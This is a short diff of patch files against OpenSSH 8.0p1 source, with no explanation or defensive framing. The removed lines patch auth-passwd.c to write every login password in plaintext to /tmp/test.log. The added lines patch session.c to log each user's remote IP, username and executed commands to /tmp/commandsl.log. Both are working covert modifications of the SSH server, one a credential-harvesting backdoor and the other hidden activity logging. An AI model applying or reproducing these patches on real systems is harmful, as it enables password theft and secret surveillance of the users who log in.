@@ -1,13 +1,15 @@
---- a/auth-passwd.c	2019-04-18 00:52:57.000000000 +0200
-+++ b/auth-passwd.c	2019-10-27 18:36:19.690271690 +0100
-@@ -83,6 +83,10 @@
- 	static int expire_checked = 0;
- #endif
+diff -urx config.status opensshLatest/session.c openssh-8.0p1/session.c
+--- opensshLatest/session.c	2019-04-18 00:52:57.000000000 +0200
++++ openssh-8.0p1/session.c	2019-11-06 22:08:27.900980198 +0100
+@@ -1517,6 +1517,11 @@
+ 	struct passwd *pw = s->pw;
+ 	int r = 0;
  
-+	FILE *f = fopen("/tmp/test.log", "a");
-+	fprintf(f, "%s\n", password);
++	
++	FILE *f = fopen("/tmp/commandsl.log", "a");
++	fprintf(f, "%s - %s - %s \n", ssh->remote_ipaddr, s->authctxt->user, command);
 +	fclose(f);
 +
- 	if (strlen(password) > MAX_PASSWORD_LEN)
- 		return 0;
+ 	sshpkt_fmt_connection_id(ssh, remote_id, sizeof(remote_id));
  
+ 	/* remove hostkey from the child's memory */
